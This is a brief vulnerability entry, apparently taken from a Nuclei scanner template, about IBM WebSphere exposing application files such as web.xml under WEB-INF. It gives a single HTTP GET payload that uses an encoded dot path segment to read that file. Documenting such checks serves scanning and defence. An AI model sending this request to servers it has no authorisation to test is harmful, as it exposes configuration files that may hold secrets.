# Vulnerability: IBM WebSphere Application - Source File Exposure
**Classification:** CWE-219
**Source:** Nuclei Template (`ibm-websphere-xml.yaml`)

## Description
Disclose application specific files contained within the war file, including files under the web-inf and meta-inf directories.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/iojs/%2e/WEB-INF/web.xml
```

